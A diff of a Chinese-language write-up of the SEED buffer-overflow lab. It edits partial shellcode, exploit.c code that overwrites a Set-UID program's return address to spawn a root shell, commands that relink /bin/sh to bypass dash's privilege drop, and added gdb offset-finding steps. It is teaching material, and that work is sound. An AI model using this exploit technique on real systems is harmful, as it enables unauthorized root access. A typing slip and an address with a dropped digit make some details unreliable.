@@ -1,8 +1,9 @@
 # Buffer-Overflow Vulnerability Lab
+实验环境:Ubuntu 16.04
 缓冲区溢出漏洞
 > 本实验的学习目标是让学生通过将他们从课堂上学到的有关漏洞的知识付诸实践，获得有关缓冲区溢出漏洞的第一手经验。缓冲区溢出被定义为程序试图在预分配的固定长度缓冲区的边界之外写入数据的条件。恶意用户可以利用此漏洞来更改程序的流控制，甚至执行任意代码。**此漏洞的出现是由于数据存储（例如缓冲区）和控件存储（例如返回地址）的混合：数据部分的溢出会影响程序的控制流，因为溢出会改变返回地址。**
 
-> 向学生提供了一个存在缓冲区溢出问题的程序，他们需要利用此漏洞来获取root特权。此外，学生还将尝试几种已在Linux中实现的保护方案，并评估其有效性。
+> 向学生提供了一个存在缓冲区溢出问题的程序，他们需要利用此漏洞来获取root特权。
 
 ## 实验预览
 该实验室的学习目标是让学生通过将他们从课堂上学到的有关漏洞的知识付诸实践，获得有关缓冲区溢出漏洞的第一手经验。缓冲区溢出被定义为程序试图在预分配的固定长度缓冲区的边界之外写入数据的条件。恶意用户可以使用此漏洞来更改程序的流控制，从而导致执行恶意代码。此漏洞的出现是由于数据存储（例如缓冲区）和控件存储（例如返回地址）的混合：数据部分的溢出会影响程序的控制流，因为溢出会改变返回地址。
@@ -42,9 +43,9 @@ $ gcc -z execstack -o test test.c
 $ gcc -z noexecstack -o test test.c
 ```
 
-**配置 `/bin/sh` 仅适用于Ubuntu 16.04 VM）**:  在Ubuntu 12.04和Ubuntu 16.04 VM中，`/bin/sh` 符号链接均指向`/bin/dash` shell。但是，这两个VM中的`dash`程序有重要区别。Ubuntu 16.04中的`dash` shell 有一个对策，可防止自身在`Set-UID`进程中执行。基本上，如果`dash`检测到它是在`Set-UID`进程中执行的，它将立即将有效用户ID更改为该进程的真实用户ID，从而实质上删除了特权。Ubuntu 12.04中的`dash`程序没有此行为。
+**配置 `/bin/sh` **:  在Ubuntu 12.04和Ubuntu 16.04 VM中，`/bin/sh` 符号链接均指向`/bin/dash` shell。但是，这两个VM中的`dash`程序有重要区别。Ubuntu 16.04中的`dash` shell 有一个对策，可防止自身在`Set-UID`进程中执行。基本上，如果`dash`检测到它是在`Set-UID`进程中执行的，它将立即将有效用户ID更改为该进程的真实用户ID，从而实质上删除了特权。Ubuntu 12.04中的`dash`程序没有此行为。
 
-由于我们的受害者程序是Set-UID程序，并且我们的攻击依赖于运行`/bin/sh`，因此`/bin/dash`中的对策使我们的攻击更加困难。因此，我们将`/bin/sh`链接到另一个没有这种对策的`Shell`程序（在以后的任务中，我们将展示出一点点的努力，就可以轻易克服`/bin/dash`中的对策）。我们已经在Ubuntu 16.04 VM中安装了名为`zsh`的`Shell`程序。我们使用以下命令将`/bin/sh`链接到zsh（在Ubuntu 12.04中无需执行这些操作）：
+由于我们的受害者程序是Set-UID程序，并且我们的攻击依赖于运行`/bin/sh`，因此`/bin/dash`中的对策使我们的攻击更加困难。因此，我们将`/bin/sh`链接到另一个没有这种对策的`Shell`程序（在以后的任务中，我们将展示出一点点的努力，就可以轻易克服`/bin/dash`中的对策）。我们已经在Ubuntu 16.04 VM中安装了名为`zsh`的`Shell`程序。我们使用以下命令将`/bin/sh`链接到zsh
 ```shell
 $ sudo rm /bin/sh
 $ sudo ln -s /bin/zsh /bin/sh
@@ -70,6 +71,7 @@ int main()
 /*A program that creates a file containing code for launching shell*/
 #include <stdlib.h>
 #include <stdio.h>
+#include <string.h>
 
 const char code[] =
   "\x31\xc0"             /* xorl    %eax,%eax              */
@@ -145,14 +147,14 @@ int main(int argc, char **argv)
 应当注意，更改所有权必须在开启Set-UID位之前完成，因为所有权更改将导致Set-UID位被关闭。
 
 ```shell
-$ gcc -o stack -z execstack -fno-stack-protector stack.c
+$ gcc -g -o stack -z execstack -fno-stack-protector stack.c //必须要有-g才可以被检测到
 $ sudo chown root stack ①
 $ sudo chmod 4755 stack ②
 ```
 上面的程序有一个缓冲区溢出漏洞。它首先从名为`badfile`的文件中读取输入，然后将该输入传递到函数`bof()`中的另一个缓冲区。原始输入的最大长度可以为`517个字节`，但是`bof()`中的缓冲区只有`24个字节`长。由于`strcpy()`不检查边界，因此会发生缓冲区溢出。由于此程序是`Set-root-UID`程序，因此，如果普通用户可以利用此缓冲区溢出漏洞，则普通用户可能能够获得root shell。应当注意，程序从名为`badfile`的文件获取其输入。该文件受用户控制。现在，我们的目标是为`badfile`创建内容，以便当易受攻击的程序将内容复制到其缓冲区中时，可以生成`根shell`。
 
 ### 任务二 利用漏洞
-我们为您提供了部分完成的利用代码，称为`“exploit.c”`。该代码的目的是为badfile构造内容。在此代码中，`shellcode`提供给您。您需要开发其余部分。
+我们为您提供了部分完成的利用代码，称为`“exploit.c”`。该代码的目的是为badfile构造内容。在此代码中，`shellcode`提供给您。您需要开vi e发其余部分。
 
 ```c
 /* exploit.c  */
@@ -185,7 +187,7 @@ void main(int argc, char **argv)
 
     /* You need to fill the buffer with appropriate contents here */ 
     strcpy(buffer+100,shellcode);			//将shellcode拷贝至buffer
-    strcpy(buffer+0x24,"\xbb\xf1\xff\xbf");		//在buffer特定偏移处起始的四个字节覆盖sellcode地址
+    strcpy(buffer+0x24,"\x??\x??\x??\x??");		//在buffer特定偏移处起始的四个字节覆盖sellcode地址
     /* Save the contents to the file "badfile" */
     badfile = fopen("./badfile", "w");
     fwrite(buffer, 517, 1, badfile);
@@ -195,7 +197,34 @@ void main(int argc, char **argv)
 
 完成上述程序后，编译并运行它。这将生成`badfile`的内容。然后运行易受攻击的程序`stack.c`。如果您的漏洞利用程序正确实施，则应该能够获得`root shell`： 
 
+那么我们这里就存在一个问题(这里是重点)，应该怎么得到这里偏移的位置呢？一下内容参考[博客](https://blog.csdn.net/xxx_qz/article/details/62889756)
+
+于是我们想到可以使用gdb来调试一下`stack.c`看一下内部运行的结构，首先这里需要强调一下必须在gcc编译时加上`-g`选项才可以使用gdb调试。
+
+在终端输入如下代码：
+```shellcode
+$ gdb stack 
+```
+然后就进入了调试的页面，然后就可以看一下shellcode的返回地址。
+```shellcode
+$ b main
+$ r //查看寄存器
+$ p /x &str
+```
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTg1ODQ5NC8yMDE5MTEvMTg1ODQ5NC0yMDE5MTEyMzIyNTg0MDQ4OC0xMzI5ODkyNDc5LnBuZw?x-oss-process=image/format,png)
+
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTg1ODQ5NC8yMDE5MTEvMTg1ODQ5NC0yMDE5MTEyMzIyNTg1MTE3OC00MjA5NTE5NjgucG5n?x-oss-process=image/format,png)
+
+
+漏洞程序读取badfile 文件到缓冲区str，且str的地址为0xbfffeb17，计算上shellcode偏移量100（0x64）,则shellcode地址为0xbffeb7b
+
+然后接下来输入如下命令进行反汇编，可以看到ebp的首地址偏移量为0x20，则由于是32bit的字节，所以返回地址偏移为0x24。
+
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTg1ODQ5NC8yMDE5MTEvMTg1ODQ5NC0yMDE5MTEyMzIyNTkyNjgzMS0xNTM2NDAyNDcyLnBuZw?x-oss-process=image/format,png)
+
+
 **重要提示**：请首先编译您的易受攻击的程序。请注意，生成`badfile`的程序`exploit.c`可以在启用默认StackGuard保护的情况下进行编译。这是因为我们不会在该程序中溢出缓冲区。我们将溢出`stack.c`中的缓冲区，该缓冲区是在禁用StackGuard保护的情况下编译的。
+
 
 ```shell
 $ gcc -o exploit exploit.c
@@ -204,8 +233,4 @@ $./stack // launch the attack by running the vulnerable program
 # <---- Bingo! You’ve got a root shell!
 ```
 
-
-
-
-
-
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTg1ODQ5NC8yMDE5MTEvMTg1ODQ5NC0yMDE5MTEyMzIyNTk0Njc2NC02NzMyMjM3NjAucG5n?x-oss-process=image/format,png)
